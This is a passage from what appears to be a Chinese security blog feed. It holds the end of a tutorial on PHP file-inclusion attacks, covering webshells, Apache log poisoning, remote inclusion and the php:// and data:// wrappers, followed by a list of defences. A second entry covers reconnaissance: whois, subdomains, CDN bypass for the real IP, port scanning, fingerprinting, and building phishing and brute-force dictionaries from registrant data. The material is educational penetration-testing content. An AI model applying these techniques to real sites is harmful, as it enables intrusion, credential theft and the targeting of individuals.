alt="image-20230724180959134"><br />可以看到fi文件夹中生成了一个webshell：<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724181012480.png" alt="image-20230724181012480"><br />使用webshell管理工具连接即可。<br />注：我们也可以直接在webshell.jpg中写一句话木马，然后再通过文件包含漏洞去连接webshell.jpg，但这种方法有时候webshell功能会出现异常。所以我们选择上面的方式，生成一个.php格式的一句话木马，再去连接。<br><a name="PsskI"></a></p><h3 id="3、包含Apache日志文件"><a href="#3、包含Apache日志文件" class="headerlink" title="3、包含Apache日志文件"></a>3、包含Apache日志文件</h3><p>有时候网站存在文件包含漏洞，但却没有文件上传点。这个时候我们还可以通过利用Apache的日志文件来生成一句话木马。<br />在用户发起请求时，服务器会将请求写入access.log，当发生错误时将错误写入error.log，日志文件如下：<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724181028212.png" alt="image-20230724181028212"><br />当我们正常访问一个网页时，如<a href="http://127.0.0.1/login.php%EF%BC%8Caccess%E6%97%A5%E5%BF%97%E4%BC%9A%E8%BF%9B%E8%A1%8C%E8%AE%B0%E5%BD%95%EF%BC%8C%E5%A6%82%E4%B8%8B%E5%9B%BE%E6%89%80%E7%A4%BA%EF%BC%9A">http://127.0.0.1/login.php，access日志会进行记录，如下图所示：</a><br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724181041242.png" alt="image-20230724181041242"><br />如果我们访问一个不存在的资源，也一样会进行记录，例如访问<br />127.0.0.1&#x2F;<?php phpinfo();?><br />但查看日志会发现被编码了，如下：<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724181056393.png" alt="image-20230724181056393"><br />我们再次进行访问，并使用burp抓包，发现被编码：<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724181112373.png" alt="image-20230724181112373"><br />我们将报文修改回去，再进行发送即可：<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724181126071.png" alt="image-20230724181126071"><br />此时再查看access日志，正确写入php代码：<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724181139082.png" alt="image-20230724181139082"><br />再通过本地文件包含漏洞访问，即可执行：<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724181152148.png" alt="image-20230724181152148"><br />我可以在此处写入一句话木马，再使用Webshell管理工具进行连接。<br><a name="M2mv0"></a></p><h2 id="四、远程文件包含"><a href="#四、远程文件包含" class="headerlink" title="四、远程文件包含"></a>四、远程文件包含</h2><p>如果PHP的配置选项allow_url_include、allow_url_fopen状态为ON的话，则include&#x2F;require函数是可以加载远程文件的，这种漏洞被称为远程文件包含漏洞（RFI）。<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724181207208.png" alt="image-20230724181207208"><br />首先我们来看一段代码：<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724181219774.png" alt="image-20230724181219774"><br />访问本地phpinfo.php文件：<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724181233197.png" alt="image-20230724181233197"><br />该页面并没有对$path做任何过滤，因此存在文件包含漏洞。<br />我们在远端Web服务器&#x2F;site&#x2F;目录下创建一个test.php文件，内容为phpinfo()，利用漏洞去读取这个文件。<br />但是代码会给我们输入的路径后面加上’&#x2F;phpinfo.php’后缀，如果php版本小于5.3.4，我们可以尝试使用%00截断，这里php版本为7.2.7，不适用。<br />还有一种截断方法就是?号截断，在路径后面输入?号，服务器会认为?号后面的内容为GET方法传递的参数，成功读取test.php如下：<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724181246356.png" alt="image-20230724181246356"><br />如果test.php是恶意webshell文件，那么利用该漏洞就可以获取到服务器权限。<br><a name="iTiWF"></a></p><h2 id="五、PHP伪协议"><a href="#五、PHP伪协议" class="headerlink" title="五、PHP伪协议"></a>五、PHP伪协议</h2><p>PHP内置了很多URL风格的封装协议，可用于类似 fopen()、 copy()、 file_exists() 和 filesize() 的文件系统函数，如下所示：<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724181258193.png" alt="image-20230724181258193"><br><a name="g0ejv"></a></p><h3 id="1、php-x2F-x2F-filter"><a href="#1、php-x2F-x2F-filter" class="headerlink" title="1、php:&#x2F;&#x2F;filter"></a>1、php:&#x2F;&#x2F;filter</h3><p>有一些敏感信息会保存在php文件中，如果我们直接利用文件包含去打开一个php文件，php代码是不会显示在页面上的，例如打开data目录下的config.php:<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724181309223.png" alt="image-20230724181309223"><br />这时候我们可以以base64编码的方式读取指定文件的源码:<br />输入：php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;文件路径<br />得到config.php加密后的源码：<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724181322702.png" alt="image-20230724181322702"><br />再进行base64解码，获取到数据库账号等敏感信息：<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724181335125.png" alt="image-20230724181335125"><br><a name="DgV4e"></a></p><h3 id="2、data-x2F-x2F"><a href="#2、data-x2F-x2F" class="headerlink" title="2、data:&#x2F;&#x2F;"></a>2、data:&#x2F;&#x2F;</h3><p>利用data:&#x2F;&#x2F; 伪协议可以直接达到执行php代码的效果，例如执行phpinfo()函数：<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724181349693.png" alt="image-20230724181349693"><br />如果此处对特殊字符进行了过滤，我们还可以通过base64编码后再输入：<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724181401910.png" alt="image-20230724181401910"><br><a name="UhorY"></a></p><h3 id="3、zip-x2F-x2F-执行压缩文件"><a href="#3、zip-x2F-x2F-执行压缩文件" class="headerlink" title="3、zip:&#x2F;&#x2F; 执行压缩文件"></a>3、zip:&#x2F;&#x2F; 执行压缩文件</h3><p>如果网站允许我们上传压缩文件，我们也可以将php文件压缩后进行上传，再通过zip:&#x2F;&#x2F;协议执行。<br />以DVWA平台为例，我们将phpinfo.php文件进行压缩后上传：<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724181416356.png" alt="image-20230724181416356"><br />通过zip:&#x2F;&#x2F;协议执行zip压缩包中的phpinfo.php文件：<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724181428246.png" alt="image-20230724181428246"><br><a name="ny4xr"></a></p><h3 id="4、php-x2F-x2F-input"><a href="#4、php-x2F-x2F-input" class="headerlink" title="4、php:&#x2F;&#x2F;input"></a>4、php:&#x2F;&#x2F;input</h3><p>利用该方法，我们可以直接写入php文件，输入file&#x3D;php:&#x2F;&#x2F;input，然后使用burp抓包，写入php代码：<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724181446800.png" alt="image-20230724181446800"><br />发送报文，可以看到本地生成了一句话木马：<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724181457704.png" alt="image-20230724181457704"><br><a name="Ebwyf"></a></p><h3 id="5、伪协议利用条件"><a href="#5、伪协议利用条件" class="headerlink" title="5、伪协议利用条件"></a>5、伪协议利用条件</h3><p>伪协议的利用方法还有很多，这里就不一一举例了。<br />伪协议的用法小结：<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724181510517.png" alt="image-20230724181510517"><br><a name="IUVe1"></a></p><h2 id="六、文件包含漏洞防护"><a href="#六、文件包含漏洞防护" class="headerlink" title="六、文件包含漏洞防护"></a>六、文件包含漏洞防护</h2><p>1、使用str_replace等方法过滤掉危险字符<br />2、配置open_basedir，防止目录遍历<br />3、php版本升级，防止%00截断<br />4、对上传的文件进行重命名，防止被读取<br />5、对于动态包含的文件可以设置一个白名单，不读取非白名单的文件<br />6、做好管理员权限划分，做好文件的权限管理</p>]]></content>
      
      
      <categories>
          
          <category> 文件包含 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安 </tag>
            
            <tag> 漏洞 </tag>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息收集</title>
      <link href="/2023/07/15/xin-xi-shou-ji/"/>
      <url>/2023/07/15/xin-xi-shou-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724110046609.png" alt="image-20230724110046609"></p><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724110110540.png" alt="image-20230724110110540"></p><h2 id="一、whois信息收集及利用方式"><a href="#一、whois信息收集及利用方式" class="headerlink" title="一、whois信息收集及利用方式"></a>一、whois信息收集及利用方式</h2><h3 id="Whois查询"><a href="#Whois查询" class="headerlink" title="Whois查询"></a>Whois查询</h3><p>1、简单介绍<br>whois（读作“Who is”，非缩写）是用来查询域名的IP以及所有者等信息的传输<br>协议。简单说，whois就是一个用来查询域名是否已经被注册，以及注册域名的详<br>细信息的数据库（如域名所有人、域名注册商）。通过whois来实现对域名信息的<br>查询。</p><h3 id="收集方式"><a href="#收集方式" class="headerlink" title="收集方式"></a>收集方式</h3><h4 id="查询网站"><a href="#查询网站" class="headerlink" title="查询网站"></a>查询网站</h4><p>爱站工具网: <a href="https://whois.aizhan.com/">https://whois.aizhan.com</a><br>站长之家: <a href="http://whois.chinaz.com/">http://whois.chinaz.com</a><br>VirusTotal: <a href="https://www.virustotal.com/">https://www.virustotal.com</a><br>Bugscaner: <a href="http://whois.bugscaner.com/">http://whois.bugscaner.com</a><br>通过这些网站可以查询域名的相关信息，如域名服务商、域名拥有者，以及他们的邮箱、电话、地址等。</p><h4 id="kali工具"><a href="#kali工具" class="headerlink" title="kali工具"></a>kali工具</h4><p>whois <a href="http://www.secdriver.com/">www.secdriver.com</a></p><h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><p> 在社工库查询邮箱和手机号，若查到，可尝试登陆服务器商或域名商。<br> 利用注册人电话，邮箱等信息通过自由拼接组合成针对网站的社工字<br>典。最后利用字典进行爆破或社工钓鱼，也可用过邮箱和手机号反查<br>找到更多注册域名。<br> DNS解析记录可以查ip,查NS、mx邮件交换记录。<br> MX记录是邮件服务交换记录，邮件服务经常搭建在目标办公网络，可<br>以让快速我们定位目标核心区域并展开渗透。</p><h2 id="二、旁站及C段收集与利用方式"><a href="#二、旁站及C段收集与利用方式" class="headerlink" title="二、旁站及C段收集与利用方式"></a>二、旁站及C段收集与利用方式</h2><p>1、简单介绍<br>旁站：是和目标网站在同一台服务器但开放在其他端口的网站。<br>C段：是和目标服务器ip处在同一个C段的其它服务器。<br>C段：同网段不同服务器的渗透方案<br>C 段嗅探指的是拿下同一C段下的服务器，也就是说是D段1-255中的一台服务器，再通过内网横向移动<br>获取你想要的服务器权限。<br>例如192.168.1.66 -&gt; 192.168.1.4 能够相互通讯<br>可以控制该网段中的192.168.1.66，再通过内网横向移动来控制 192.168.1.4<br>注意：一般情况下云服务器C段的IP都是相互独立的，这些服务器分属不同用户，没有渗透的必要<br>在线查询网站<br><a href="https://www.webscan.cc/">https://www.webscan.cc/</a></p><h3 id="收集方式-1"><a href="#收集方式-1" class="headerlink" title="收集方式"></a>收集方式</h3><h4 id="站长之家"><a href="#站长之家" class="headerlink" title="站长之家"></a>站长之家</h4><p>地址： <a href="http://ip.tool.chinaz.com/Same/">http://ip.tool.chinaz.com/Same/</a></p><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724110225843.png" alt="image-20230724110225843"></p><h4 id="Google"><a href="#Google" class="headerlink" title="Google"></a>Google</h4><p>地址：<a href="https://www.google.com/">https://www.google.com</a><br>语法：site:211.69.130.*</p><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724110251392.png" alt="image-20230724110251392"></p><h4 id="FOFA、Shodan"><a href="#FOFA、Shodan" class="headerlink" title="FOFA、Shodan"></a>FOFA、Shodan</h4><p>地址：<a href="https://fofa.so/">https://fofa.so/</a>       <a href="https://www.shodan.io/">https://www.shodan.io/</a></p><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724110320068.png" alt="image-20230724110320068"></p><p> FOFA、Shodan<br>规则：直接输入查询语句，将从标题，html内容，http头信息，url字段中搜索</p><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724110341870.png" alt="image-20230724110341870"></p><h4 id="钟馗之眼"><a href="#钟馗之眼" class="headerlink" title="钟馗之眼"></a>钟馗之眼</h4><p>地址：<a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a></p><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724110409616.png" alt="image-20230724110409616"></p><h4 id="御剑高速端口扫描工具"><a href="#御剑高速端口扫描工具" class="headerlink" title="御剑高速端口扫描工具"></a>御剑高速端口扫描工具</h4><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724110432111.png" alt="image-20230724110432111"></p><h4 id="工具扫描"><a href="#工具扫描" class="headerlink" title="工具扫描"></a>工具扫描</h4><p>nmap<br>nmap 是一款开源免费的针对大型网络的端口扫描工具，nmap可以检测目标主机是否在线、主机端口开放情况、检测主机运行的服务类型及版本信息、检测操作系统与设备类型等信息<br>nmap <a href="https://blog.csdn.net/qq_37964989/article/details/84330693">常用指令</a><br>masscan<br>masscan 是 Kali 下集成的高效扫描器 , 速度非常快<br>masscan <a href="https://huskypower.blog.csdn.net/article/details/115291661?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-115291661-blog-110383622.pc_relevant_multi_platform_whitelistv4&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-115291661-blog-110383622.pc_relevant_multi_platform_whitelistv4&utm_relevant_index=1">常用指令</a></p><h3 id="利用方式-1"><a href="#利用方式-1" class="headerlink" title="利用方式"></a>利用方式</h3><p>如果一台服务器通过其上的一个网站拿不下，可以从旁站入手，即同<br>一服务器上的其他网站，最终也可拿下这台服务器。<br>很多系统并没有绑定域名，通过子域名能够获得的资产是有限的，这<br>时候若想找到更多资产，可从C段入手。</p><h2 id="三、真实IP收集及其利用方式"><a href="#三、真实IP收集及其利用方式" class="headerlink" title="三、真实IP收集及其利用方式"></a>三、真实IP收集及其利用方式</h2><p>1、简单介绍<br>CDN：全称Content Delivery Network，即内容分发网络，CDN的基本原理是广泛<br>采用各种缓存服务器，将这些缓存服务器分布到用户访问的网络中，在用户访问<br>网站时，由距离最近的缓存服务器直接响应用户请求。<br>首先需要确认目标网站是否使用了CDN，可使用多地ping的方式。如使用CDN，<br>需绕过CDN查找真实IP。</p><h3 id="收集方式-2"><a href="#收集方式-2" class="headerlink" title="收集方式"></a>收集方式</h3><h4 id="全球Ping检测"><a href="#全球Ping检测" class="headerlink" title="全球Ping检测"></a>全球Ping检测</h4><p>地址：<a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a>   <a href="https://www.wepcc.com/">https://www.wepcc.com/</a></p><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724110551066.png" alt="image-20230724110551066"></p><h4 id="查询网"><a href="#查询网" class="headerlink" title="查询网"></a>查询网</h4><p>地址：<a href="https://site.ip138.com/">https://site.ip138.com/</a></p><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724110648624.png" alt="image-20230724110648624"></p><h4 id="Web-ip-Lookup"><a href="#Web-ip-Lookup" class="headerlink" title="Web ip Lookup"></a>Web ip Lookup</h4><p>地址：<a href="https://webiplookup.com/">https://webiplookup.com/</a></p><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724110714016.png" alt="image-20230724110714016"></p><h4 id="XCDN"><a href="#XCDN" class="headerlink" title="XCDN"></a>XCDN</h4><p>地址：<a href="https://github.com/3xp10it/xcdn">https://github.com/3xp10it/xcdn</a></p><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724110738596.png" alt="image-20230724110738596"></p><h4 id="其他方式"><a href="#其他方式" class="headerlink" title="其他方式"></a>其他方式</h4><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724110806142.png" alt="image-20230724110806142"></p><h3 id="利用方式-2"><a href="#利用方式-2" class="headerlink" title="利用方式"></a>利用方式</h3><p>通过ip反查可确定是否该网站真实ip。<br>找到真实ip后可准确地进行端口扫描和C段扫描。</p><h2 id="四、子域名收集及其利用方式"><a href="#四、子域名收集及其利用方式" class="headerlink" title="四、子域名收集及其利用方式"></a>四、子域名收集及其利用方式</h2><p>1、简单介绍<br>子域名：域名按照层级可以分为顶级域、主域名、子域名等 。例如.net 是顶级<br>域，主域名是sony.net，子域名则是在主域名的前面添加自定义名称，例如像<br>sony.net 、mail.sony.net 这一类都可统称为子域名。<br>例如：很多人都误把带www当成一级域名，把其他前缀的当成二级域名；或者<br>把二级域名当成一级域名。这些都是错误的。以sony.net为例，正确的域名划<br>分为：.net 顶级域名&#x2F;一级域名，sony.net 二级域名，s.sony.net 三级域名，<br>s.s.sony.net 四级域名</p><h3 id="收集方式-3"><a href="#收集方式-3" class="headerlink" title="收集方式"></a>收集方式</h3><h4 id="域名信息查询"><a href="#域名信息查询" class="headerlink" title="域名信息查询"></a>域名信息查询</h4><p>ping secdriver.com   # ping DNS解析<br>nslookup secdriver.com  # nslookup DNS解析</p><h4 id="IP反查域名"><a href="#IP反查域名" class="headerlink" title="IP反查域名"></a>IP反查域名</h4><p>通过IP可以反查出绑定在该网站的域名，来发现更多资产<br>ip138: <a href="https://site.ip138.com/">https://site.ip138.com/</a><br>webscan: <a href="https://www.webscan.cc/">https://www.webscan.cc/</a><br>VirusTotal: <a href="https://www.virustotal.com/">https://www.virustotal.com</a><br>微步在线：<a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></p><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724110831469.png" alt="image-20230724110831469"></p><h4 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h4><p>假设我们的目标网络规模比较大，直接从主域入手显然是很不理智的，因为对于这种规模的目标，一般其主域都是重点防护区域，所以不如先进入目标的某个子域，然后再想办法迂回接近真正的目标。<br>网站查询子域名<br>VirusTotal <a href="https://www.virustotal.com/gui/home/search">https://www.virustotal.com/gui/home/search</a><br>fofa <a href="https://fofa.info/">https://fofa.info/</a> </p><h4 id="工具扫描-1"><a href="#工具扫描-1" class="headerlink" title="工具扫描"></a>工具扫描</h4><p>Layer子域名挖掘机</p><h4 id="ICP备案信息查询"><a href="#ICP备案信息查询" class="headerlink" title="ICP备案信息查询"></a>ICP备案信息查询</h4><p>网站备案是根据国家法律法规规定，需要网站的所有者向国家有关部门申请的备案，这是国家信息产业部对网站的一种管理，为了防止在网上从事非法的网站经营活动的发生。主要针对国内网站，如果网站搭建在其他国家，则不需要进行备案。<br>常用的网站有以下几个：<br>工业和信息化部政务服务平台：<a href="https://beian.miit.gov.cn/">https://beian.miit.gov.cn/</a><br>全国互联网安全管理平台：<a href="http://www.beian.gov.cn/portal/recordQuery">http://www.beian.gov.cn/portal/recordQuery</a><br>天眼查：<a href="http://www.tianyancha.com/">http://www.tianyancha.com</a></p><h4 id="Google语法"><a href="#Google语法" class="headerlink" title="Google语法"></a>Google语法</h4><p>site:*.qq.com</p><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724110851967.png" alt="image-20230724110851967"></p><h4 id="空间探测"><a href="#空间探测" class="headerlink" title="空间探测"></a>空间探测</h4><p>例如：Fofa：domain:sony.net<br>其他搜索引擎：Zoomeye\Shodan</p><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724110917234.png" alt="image-20230724110917234"></p><h4 id="工查看https证书-（没有用过，应该不常用）"><a href="#工查看https证书-（没有用过，应该不常用）" class="headerlink" title="工查看https证书 （没有用过，应该不常用）"></a>工查看https证书 （没有用过，应该不常用）</h4><p>证书 – 详细信息 – 使用者 可选名称</p><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724110937914.png" alt="image-20230724110937914"></p><h4 id="DNS-A记录"><a href="#DNS-A记录" class="headerlink" title="DNS A记录"></a>DNS A记录</h4><p><a href="https://hackertarget.com/find-dns-host-records/">https://hackertarget.com/find-dns-host-records/</a></p><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724111009757.png" alt="image-20230724111009757"></p><h4 id="DNS-流量"><a href="#DNS-流量" class="headerlink" title="DNS 流量"></a>DNS 流量</h4><p><a href="https://dnsdumpster.com/">https://dnsdumpster.com</a></p><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724111027493.png" alt="image-20230724111027493"></p><h4 id="枚举爆破（在线、本地"><a href="#枚举爆破（在线、本地" class="headerlink" title="枚举爆破（在线、本地)"></a>枚举爆破（在线、本地)</h4><p>在线爆破<br>地址：<a href="https://blast.uixsj.cn/">https://blast.uixsj.cn/</a>     <a href="https://phpinfo.me/domain/">https://phpinfo.me/domain/</a></p><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724111048803.png" alt="image-20230724111048803"></p><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724111057943.png" alt="image-20230724111057943"></p><h3 id="利用方式-3"><a href="#利用方式-3" class="headerlink" title="利用方式"></a>利用方式</h3><p>子域名可以扩大攻击范围，同一个域名下的二级域名都属于相同资产，<br>一般而言都有相关的联系</p><h2 id="五、端口开放收集及其利用方式"><a href="#五、端口开放收集及其利用方式" class="headerlink" title="五、端口开放收集及其利用方式"></a>五、端口开放收集及其利用方式</h2><p>1、简单介绍<br>计算机“端口”是英文port的义译，可以认为是计算机与外界通讯交流的出口，计算机有0~65535，共计65536个端口。端口作为服务器和客户端交互的接口，起着非常重要的作用。一些常见的端口标识出服务器开启了什么服务，比如3389端口开启，可以认为服务器系统为windows并且开启了远程服务的功能。所以，端口扫描在渗透测试中是非常重要的。</p><h3 id="收集方式-4"><a href="#收集方式-4" class="headerlink" title="收集方式"></a>收集方式</h3><h4 id="Nmap-x2F-Masscan"><a href="#Nmap-x2F-Masscan" class="headerlink" title="Nmap&#x2F;Masscan"></a>Nmap&#x2F;Masscan</h4><p>nmap<br>nmap 是一款开源免费的针对大型网络的端口扫描工具，nmap可以检测目标主机是否在线、主机端口开放情况、检测主机运行的服务类型及版本信息、检测操作系统与设备类型等信息<br>nmap <a href="https://blog.csdn.net/qq_37964989/article/details/84330693">常用指令</a><br>masscan<br>masscan 是 Kali 下集成的高效扫描器 , 速度非常快<br>masscan <a href="https://huskypower.blog.csdn.net/article/details/115291661?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-115291661-blog-110383622.pc_relevant_multi_platform_whitelistv4&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-115291661-blog-110383622.pc_relevant_multi_platform_whitelistv4&utm_relevant_index=1">常用指令</a></p><h4 id="插件探测"><a href="#插件探测" class="headerlink" title="插件探测"></a>插件探测</h4><p>Fofa Pro view  （目前已经毙掉）<br>shodan   火狐</p><h4 id="御剑端口扫描工具"><a href="#御剑端口扫描工具" class="headerlink" title="御剑端口扫描工具"></a>御剑端口扫描工具</h4><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724111126973.png" alt="image-20230724111126973"></p><h4 id="在线扫描网站"><a href="#在线扫描网站" class="headerlink" title="在线扫描网站"></a>在线扫描网站</h4><p><a href="http://coolaf.com/tool/port">http://coolaf.com/tool/port</a></p><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724111148544.png" alt="image-20230724111148544"></p><h3 id="利用方式-4"><a href="#利用方式-4" class="headerlink" title="利用方式"></a>利用方式</h3><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724111209026.png" alt="image-20230724111209026"></p><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724111221622.png" alt="image-20230724111221622"></p><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724111234306.png" alt="image-20230724111234306"></p><h2 id="六、网站指纹收集及其利用方式"><a href="#六、网站指纹收集及其利用方式" class="headerlink" title="六、网站指纹收集及其利用方式"></a>六、网站指纹收集及其利用方式</h2><p>1、简单介绍<br>网站指纹：网站指纹包括应用名、版本、前端框架、后端框架、服务端语言、服<br>务器操作系统、网站容器、内容管理系统和数据库等。<br>网站指纹识别<br>在web渗透过程中，Web指纹识别是信息收集环节中一个比较重要的步骤，通过一些开源的工具、平台<br>或者手工检测CMS系统是公开的CMS程序还是二次开发至关重要，能准确的获取CMS类型、Web服务组<br>件类型及版本信息可以帮助安全工程师快速有效的去验证已知漏洞。对目标渗透测试过程中，目标的<br>cms是十分重要的信息，有了目标的cms，就可以利用相关bug进行测试，进行代码审计等。</p><h3 id="识别方式"><a href="#识别方式" class="headerlink" title="识别方式"></a>识别方式</h3><p>1.网站特有文件<br>如&#x2F;templets&#x2F;default&#x2F;style&#x2F;dedecms.css — dedecms<br>2.网站独有文件的md5<br>如favicon.ico，但是该文件可以被修改导致不准确。<br>文件md5计算 certutil -hashfile filename MD5<br>3.网站文件命名规则<br>4.返回头的关键字 如 header&#x3D;”rememberMe&#x3D;deleteMe”<br>5.网页关键字<br>如 &#x2F;data&#x2F;sessions&#x2F;index.html——dedecms&#x2F;data&#x2F;admin&#x2F;ver.txt<br>6.Url特征<br>10.网站路径特征<br>11.网站静态资源<br>12.爬虫网站目录信息<br>指纹识别的对象<br>1、CMS信息：比如大汉CMS、织梦、帝国CMS、phpcms、ecshop等；<br>2、前端技术：比如HTML5、jquery、bootstrap、pure、ace等；<br>3、Web服务器：比如Apache、lighttpd, Nginx, IIS等；<br>4、应用服务器：比如Tomcat、Jboss、weblogic、websphere等；<br>5、开发语言：比如PHP、Java、Ruby、Python、C#等；<br>6、操作系统信息：比如linux、win2008、win7、kali、centos等；<br>7、CDN信息：是否使用CDN，如cloudflare、360cdn、365cyd、yunjiasu等；<br>8、WAF信息：是否使用waf，如Topsec、safedog、Yundun等；<br>9、IP及域名信息：IP和域名注册信息、服务商信息等；<br>10、端口信息：有些软件或平台还会探测服务器开放的常见端口。<br>示例网站：<a href="http://ask.ltsec.com/">http://ask.ltsec.com/</a><br>目录信息收集<br>寻找到网站后台管理<br>寻找未授权界面<br>寻找网站更多隐藏信息<br>发现这个网站存在多少个目录，多少个页面，探索出网站的整体结构<br>发现敏感文件，后台文件，数据库文件，和信息泄漏文件等等</p><p>在线指纹识别：<br><a href="http://whatweb.bugscaner.com/">http://whatweb.bugscaner.com/</a> </p><h3 id="收集方式-5"><a href="#收集方式-5" class="headerlink" title="收集方式"></a>收集方式</h3><h4 id="目录扫描工具"><a href="#目录扫描工具" class="headerlink" title="目录扫描工具"></a>目录扫描工具</h4><p>dirsearch<br>dirsearch是一个基于python3的命令行工具，旨在暴力扫描页面结构，包括网页中的目录和文件依赖安装： pip install -r requirements.txt<br>dirsearch <a href="https://blog.csdn.net/qq_43936524/article/details/115271837?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166927308416782427429357%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=166927308416782427429357&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-115271837-null-null.142%5Ev66%5Econtrol,201%5Ev3%5Econtrol_1,213%5Ev2%5Et3_esquery_v1&utm_term=dirsearch&spm=1018.2226.3001.4187">用法大全</a><br>火狐插件Wappalyzer</p><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724111259464.png" alt="image-20230724111259464"></p><h4 id="Whatweb"><a href="#Whatweb" class="headerlink" title="Whatweb"></a>Whatweb</h4><p>Kali工具：whatweb<br>whatweb 域名 # 单个域名识别</p><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724111318556.png" alt="image-20230724111318556"></p><h4 id="云悉安全"><a href="#云悉安全" class="headerlink" title="云悉安全"></a>云悉安全</h4><p>地址：<a href="http://www.yunsee.cn/">http://www.yunsee.cn</a></p><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724111339526.png" alt="image-20230724111339526"></p><h4 id="Bugscaner"><a href="#Bugscaner" class="headerlink" title="Bugscaner"></a>Bugscaner</h4><p>地址：<a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a></p><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724111359935.png" alt="image-20230724111359935"></p><h3 id="利用方式-5"><a href="#利用方式-5" class="headerlink" title="利用方式"></a>利用方式</h3><p>识别出的数据库类型及操作系统类型等可结合其他漏洞利用<br>识别出的网站脚本语言可选择对应字典扫描目录<br>识别出的框架可搜索历史爆出过的漏洞，尝试使用POC&#x2F;EXP</p><h2 id="七、谷歌语法Github及利用方式"><a href="#七、谷歌语法Github及利用方式" class="headerlink" 